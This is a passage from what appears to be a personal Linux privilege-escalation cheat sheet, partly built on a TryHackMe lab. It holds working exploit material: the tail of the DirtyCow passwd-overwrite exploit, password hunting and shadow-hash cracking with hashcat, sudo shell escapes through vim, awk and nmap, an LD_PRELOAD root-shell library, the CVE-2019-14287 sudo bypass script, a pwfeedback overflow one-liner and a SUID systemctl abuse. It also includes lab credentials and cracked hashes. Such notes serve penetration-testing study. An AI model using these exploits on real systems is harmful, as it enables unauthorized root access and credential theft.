  fclose(source);
  fclose(target);

  return 0;
}

int main(int argc, char *argv[])
{
  // backup file
  int ret = copy_file(filename, backup_filename);
  if (ret != 0) {
    exit(ret);
  }

  struct Userinfo user;
  // set values, change as needed
  user.username = "firefart";
  user.user_id = 0;
  user.group_id = 0;
  user.info = "pwned";
  user.home_dir = "/root";
  user.shell = "/bin/bash";

  char *plaintext_pw;

  if (argc >= 2) {
    plaintext_pw = argv[1];
    printf("Please enter the new password: %s\n", plaintext_pw);
  } else {
    plaintext_pw = getpass("Please enter the new password: ");
  }

  user.hash = generate_password_hash(plaintext_pw);
  char *complete_passwd_line = generate_passwd_line(user);
  printf("Complete line:\n%s\n", complete_passwd_line);

  f = open(filename, O_RDONLY);
  fstat(f, &st);
  map = mmap(NULL,
             st.st_size + sizeof(long),
             PROT_READ,
             MAP_PRIVATE,
             f,
             0);
  printf("mmap: %lx\n",(unsigned long)map);
  pid = fork();
  if(pid) {
    waitpid(pid, NULL, 0);
    int u, i, o, c = 0;
    int l=strlen(complete_passwd_line);
    for(i = 0; i < 10000/l; i++) {
      for(o = 0; o < l; o++) {
        for(u = 0; u < 10000; u++) {
          c += ptrace(PTRACE_POKETEXT,
                      pid,
                      map + o,
                      *((long*)(complete_passwd_line + o)));
        }
      }
    }
    printf("ptrace %d\n",c);
  }
  else {
    pthread_create(&pth,
                   NULL,
                   madviseThread,
                   NULL);
    ptrace(PTRACE_TRACEME);
    kill(getpid(), SIGSTOP);
    pthread_join(pth,NULL);
  }

  printf("Done! Check %s to see if the new user was created.\n", filename);
  printf("You can log in with the username '%s' and the password '%s'.\n\n",
    user.username, plaintext_pw);
    printf("\nDON'T FORGET TO RESTORE! $ mv %s %s\n",
    backup_filename, filename);
  return 0;
}         
```
The exploit Dirtycow shows in the comments how to compile and run it. I recommend using `-static` flag as well to make the program portable.
The linux-exploit-suggester.sh (check my repo `hacking-tools` in `escalation` folder)can also find exploits for you and it will identify the same exploit.

If you can't download the code and exploit it on the target machine you can compile it on your machine and `scp` or start and local http server and download it with `wget` in my repo `hacking-tools` in the folder `helpers` I have a script `startHttpServer.sh` that will set up a python http server on port 8000 (or what ever port you pass to the script as an argument). Then you can download it with something like `wget http://[YOUR_IP]:8000/[NAME_OF_PROGRAM]`.  
Then run it 
``` c
./dirty [PASSWORD]
```
When you get the control back type `su firefart` or `ssh firefart@[TARGET_IP]`

## Escalation via Stored Passwords
When you get access to a machine, start looking in the history to see if it is any password used by the user. To do that use the command `history` or `less ~/.bash_history`. If you find something, try to locate where it goes and hopefully it escalates your privileges or take you some where else.

Other ways to find password can be
``` bash
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
```
Try to search for other strings like PASS, PASSWD or PWD. TOKEN can also be useful.

## Escalation via Weak File Permissions
This example is from [Linux PrivEsc Arena](https://tryhackme.com/r/room/linuxprivescarena) on Try Hack Me

---

This room will teach you a variety of Linux privilege escalation tactics, including kernel exploits, sudo attacks, SUID attacks, scheduled task attacks, and more. This lab was built utilizing Sagi Shahar's privesc workshop (https://github.com/sagishahar/lpeworkshop) and utilized as part of The Cyber Mentor's Linux Privilege Escalation Udemy course (http://udemy.com/course/linux-privilege-escalation-for-beginners).

All tools needed to complete this course are in the user folder (/home/user/tools).

Let's first connect to the machine. SSH is open on port 22. Your credentials are:

username: TCM
password: Hacker123

---

If it turns out that you have read access to `/etc/shadow` you can escalate your privileges by "unshadowing" the file.
``` bash
$ ls -la /etc/passwd
-rw-r--r-- 1 root root 950 Jun 17  2020 /etc/passwd
$ ls -ls /etc/shadow
4 -rw-rw-r-- 1 root shadow 809 Jun 17  2020 /etc/shadow
```
Take a look at the content
``` bash
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:103::/var/spool/exim4:/bin/false
sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
statd:x:103:65534::/var/lib/nfs:/bin/false
TCM:x:1000:1000:user,,,:/home/user:/bin/bash
$ cat /etc/shadow
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
daemon:*:17298:0:99999:7:::
bin:*:17298:0:99999:7:::
sys:*:17298:0:99999:7:::
sync:*:17298:0:99999:7:::
games:*:17298:0:99999:7:::
man:*:17298:0:99999:7:::
lp:*:17298:0:99999:7:::
mail:*:17298:0:99999:7:::
news:*:17298:0:99999:7:::
uucp:*:17298:0:99999:7:::
proxy:*:17298:0:99999:7:::
www-data:*:17298:0:99999:7:::
backup:*:17298:0:99999:7:::
list:*:17298:0:99999:7:::
irc:*:17298:0:99999:7:::
gnats:*:17298:0:99999:7:::
nobody:*:17298:0:99999:7:::
libuuid:!:17298:0:99999:7:::
Debian-exim:!:17298:0:99999:7:::
sshd:*:17298:0:99999:7:::
statd:*:17299:0:99999:7:::
TCM:$6$hDHLpYuo$El6r99ivR20zrEPUnujk/DgKieYIuqvf9V7M.6t6IZzxpwxGIvhqTwciEw16y/B.7ZrxVk1LOHmVb/xyEyoUg.:18431:0:99999:7:::
```
The `x` in the second column in `/etc/passwd` show that the use has a password set in `/etc/shadow`.  
Looking in `/etc/shadow` we can se that two users, root and TCM, got an hash in the second column. This means they have passwords. 
The symbol `*` in the shadow field means no password can be used to access the account. This usually occurs in daemon accounts that an ordinary user can't access, such as root, bin, daemon, etc.

Now copy the content and place it into two files on your attack machine. And then remove all lines for users without password so you get this
``` bash
$ passwd
root:x:0:0:root:/root:/bin/bash
TCM:x:1000:1000:user,,,:/home/user:/bin/bash
$ cat shadow
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
TCM:$6$hDHLpYuo$El6r99ivR20zrEPUnujk/DgKieYIuqvf9V7M.6t6IZzxpwxGIvhqTwciEw16y/B.7ZrxVk1LOHmVb/xyEyoUg.:18431:0:99999:7:::
```
Then it's time to unshadow the file using the tool `unshadow`. It takes two filenames as arguments, the passwd and shadow files  
``` bash
$ unshadow passwd shadow 
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:0:0:root:/root:/bin/bash
TCM:$6$hDHLpYuo$El6r99ivR20zrEPUnujk/DgKieYIuqvf9V7M.6t6IZzxpwxGIvhqTwciEw16y/B.7ZrxVk1LOHmVb/xyEyoUg.:1000:1000:user,,,:/home/user:/bin/bash
```
This will print out a joint file with the hash inside the passwd file. Save it to a new file.

Now we need to find out the type of the hash so that we can run `hashcat` on googling "hashcat hash modes" will get you to the hashcat page with a table with all supported hashes that hashcat can crack. Search the page for "$6$" to get the correct hash mode.

It will show you this line
| Hash-Mode | Hash-Name | Example |
| - | - | - |
|1800 | sha512crypt, SHA512 (Unix) 2 | $6$52450745$k5ka2p8bFuSmoVT1tzOyyuaREkkKBcCNqoDKzYiJL9RaE8yMnPgh2XzzF0NDrUhgrcLwg78xs1w5pJiypEdFX/ |
|  |  |  |

Here comes a shortend output from hashat help
``` bash
$ hashcat --help
hashcat (v6.2.6) starting in help mode

Usage: hashcat [options]... hash|hashfile|hccapxfile [dictionary|mask|directory]...

- [ Options ] -

 Options Short / Long           | Type | Description                                          | Example
================================+======+======================================================+=======================
 -m, --hash-type                | Num  | Hash-type, references below (otherwise autodetect)   | -m 1000
 -a, --attack-mode              | Num  | Attack-mode, see references below                    | -a 3
 -V, --version                  |      | Print version                                        |
 -O, --optimized-kernel-enable  |      | Enable optimized kernels (limits password length)    |

```
Then run the command to crack the password. This is best doing om a physical machine to be able to use GPU instead of virtual VPU since it is a heavy load cracking.

``` bash
$ hashcat -m 1800 unshadow passwords.txt -o output -O
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) i5-6200U CPU @ 2.30GHz, 6876/13817 MB (2048 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 15

Hashes: 2 digests; 2 unique digests, 2 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Uses-64-Bit

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: passwords.txt
* Passwords.: 3
* Bytes.....: 34
* Keyspace..: 3
* Runtime...: 0 secs

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.           

                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
Hash.Target......: unshadow
Time.Started.....: Fri Mar 22 06:43:49 2024 (1 sec)
Time.Estimated...: Fri Mar 22 06:43:50 2024 (0 secs)
Kernel.Feature...: Optimized Kernel
Guess.Base.......: File (passwords.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:        9 H/s (0.99ms) @ Accel:32 Loops:1024 Thr:1 Vec:4
Recovered........: 2/2 (100.00%) Digests (total), 2/2 (100.00%) Digests (new), 2/2 (100.00%) Salts
Progress.........: 6/6 (100.00%)
Rejected.........: 0/6 (0.00%)
Restore.Point....: 0/3 (0.00%)
Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:4096-5000
Candidate.Engine.: Device Generator
Candidates.#1....: password123 -> Hacker123
Hardware.Mon.#1..: Temp: 45c Util: 35%

Started: Fri Mar 22 06:43:10 2024
Stopped: Fri Mar 22 06:43:52 2024

$ cat output
$6$hDHLpYuo$El6r99ivR20zrEPUnujk/DgKieYIuqvf9V7M.6t6IZzxpwxGIvhqTwciEw16y/B.7ZrxVk1LOHmVb/xyEyoUg.:Hacker123
$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:password123
```
Since *Hacker123* is the user TCM's password we now know that root's password is *password123*.
So lets try it out
``` bash
TCM@debian:~$ su -
Password: 
root@debian:~#
```

## Escalation via SSH Keys
There are some commands that can help you finding ssh-keys on a machine
``` bash
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null
```
If you can't find anything, try search for `find / -name id_rsa 2> /dev/null` in case other keys than rsa is used.

Copy what you find to attacking machine and try to login as `root` 

## Escalation via Sudo Shell Escaping
A great place to find vulnerables is at [GTFObins](https://gtfobins.github.io/)

First check what you can run as root
``` bash
$ sudo -l
Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD

User TCM may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
```
Try to see it there is a way of exploiting vim and sudo to get higher privileges.  
Seaching for vim and then click on sudo will show you this command `sudo vim -c ':!/bin/sh'`, so let's try it out
``` bash
$ sudo vim -c ':!/bin/sh'

sh-4.1# whoami
root
```
Other suitable commands to get root on this machine are
``` bash
$ sudo find /bin -name nano -exec /bin/sh \;
$ sudo awk 'BEGIN {system("/bin/sh")}'
$ echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
```

## Escalation via Intended Functionality
Sometimes there is no need for an exploit since some command have intended functionality in a way it was not intended

Looking at what can be run as sudo again
``` bash
$ sudo -l
Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD

User TCM may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
```
searching for apache on GTFObins give no result... But googling a bit shows that apache have a build in way to read system files `sudo apache2 -f /etc/shadow`

Trying it out gives this result
```
$ sudo apache2 -f /etc/shadow
Syntax error on line 1 of /etc/shadow:
Invalid command 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration
```
An error, but we still get the hash for root!

## Escalation via LD_PRELOAD
Looking again at the `sudo -l` command shows that the user can use *LD_PRELOAD* command.  
This is a way of preload a lib before the acctual command runs
``` bash
$ sudo -l
Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD

User TCM may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
```
``` bash
$ vi ld_preload_shell.c
enter the following content
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

$ gcc -fPIC -shared -o ld_preload_shell.so ld_preload_shell.c -nostartfiles
$ ll
total 16
-rwxr-xr-x  1 TCM user 3975 Mar 22 04:53 ld_preload_shell.so
-rw-r--r--  1 TCM user  164 Mar 22 04:52 ld_preload_shell.c
```

```
$ sudo LD_PRELOAD=/home/user/ld_preload_shell.so apache2
root@debian:/home/user#
```
## CVE-2019-14287
Security Bypass
This is a flaw in sudo versions up to 1.8.27

``` python
# Exploit Title : sudo 1.8.27 - Security Bypass
# Date : 2019-10-15
# Original Author: Joe Vennix
# Exploit Author : Mohin Paramasivam (Shad0wQu35t)
# Version : Sudo <1.8.28
# Tested on Linux
# Credit : Joe Vennix from Apple Information Security found and analyzed the bug
# Fix : The bug is fixed in sudo 1.8.28
# CVE : 2019-14287

'''Check for the user sudo permissions

sudo -l 

User hacker may run the following commands on kali:
    (ALL, !root) /bin/bash


So user hacker can't run /bin/bash as root (!root)


User hacker sudo privilege in /etc/sudoers

# User privilege specification
root    ALL=(ALL:ALL) ALL

hacker ALL=(ALL,!root) /bin/bash


With ALL specified, user hacker can run the binary /bin/bash as any user

EXPLOIT: 

sudo -u#-1 /bin/bash

Example : 

hacker@kali:~$ sudo -u#-1 /bin/bash
root@kali:/home/hacker# id
uid=0(root) gid=1000(hacker) groups=1000(hacker)
root@kali:/home/hacker#

Description :
Sudo doesn't check for the existence of the specified user id and executes the with arbitrary user id with the sudo priv
-u#-1 returns as 0 which is root's id

and /bin/bash is executed with root permission
Proof of Concept Code :

How to use :
python3 sudo_exploit.py

'''


#!/usr/bin/python3

import os

#Get current username

username = input("Enter current username :")


#check which binary the user can run with sudo

os.system("sudo -l > priv")


os.system("cat priv | grep 'ALL' | cut -d ')' -f 2 > binary")

binary_file = open("binary")

binary= binary_file.read()

#execute sudo exploit

print("Lets hope it works")

os.system("sudo -u#-1 "+ binary)
```
## CVE-2019-18634
'pwfeedback' Buffer Overflow  
Sudo versions prior to 1.8.26  
Sudo's pwfeedback option can be used to provide visual feedback when the user is inputting  
their password. For each key press, an asterisk is printed. This option was added in  
response to user confusion over how the standard Password: prompt disables the echoing   
of key presses. While pwfeedback is not enabled by default in the upstream version of sudo,  
some systems, such as Linux Mint and Elementary OS, do enable it in their default sudoers files.  

Due to a bug, when the pwfeedback option is enabled in the sudoers file, a user may be able to trigger a stack-based buffer overflow.  
This bug can be triggered even by users not listed in the sudoers file. There is no impact unless pwfeedback has been enabled.  
https://github.com/saleemrashid/sudo-cve-2019-18634

``` bash
$ perl -e 'print(("A" x 100 . "\x{00}") x 50)' | sudo -S id
```

## SUID
The SUID stands for setuid which means that a command runs as the owning user. This can be exploited for some services.

One way to find command with the SUID is to run this

``` bash
find / -perm -u=s -type f 2>/dev/null
```
what it does is find files from folder `/`, looking for permission where `u=s` and the type is `f` (file) and send errors to `/dev/null` 
Here is an example  
``` bash
$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/at
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/squid/pinger
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/ping6
/bin/umount
/bin/systemctl
/bin/ping
/bin/fusermount
/sbin/mount.cifs
```

Looking at [GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/#suid) for systemctl will give (kind of) this solution.

``` bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```
This will make a temporary file as a service  
`TF=$(mktemp).service`  
Then put the content in that service that will execute (as root) in the file  
``` bash
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
```
Here you want to modify this line to do what you want  
`ExecStart=/bin/sh -c "id > /tmp/output"`  
Then you link the new service to the system  
`/bin/systemctl link $TF`  
and activate and run it  
`/bin/systemctl enable --now $TF`  
You now have the output from your command in the file `/tmp/output`
